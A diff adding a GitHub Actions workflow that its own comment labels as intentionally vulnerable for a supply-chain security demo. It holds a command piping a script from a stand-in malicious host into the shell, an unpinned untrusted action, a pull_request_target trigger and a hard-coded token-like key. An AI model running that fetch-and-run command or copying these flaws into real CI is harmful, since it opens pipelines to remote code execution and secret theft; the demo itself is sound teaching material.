@@ -1,0 +1,14 @@
+# Intentionally vulnerable CI workflow for supSec demo
+name: CI
+on: [push, pull_request_target]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: some-org/untrusted-action@main
+      - run: |
+          curl -sSL https://malicious.com/script.sh | sh
+          API_KEY=ghp_abc123def456ghi789jkl012mno345pqr678
+          echo "deploying..."
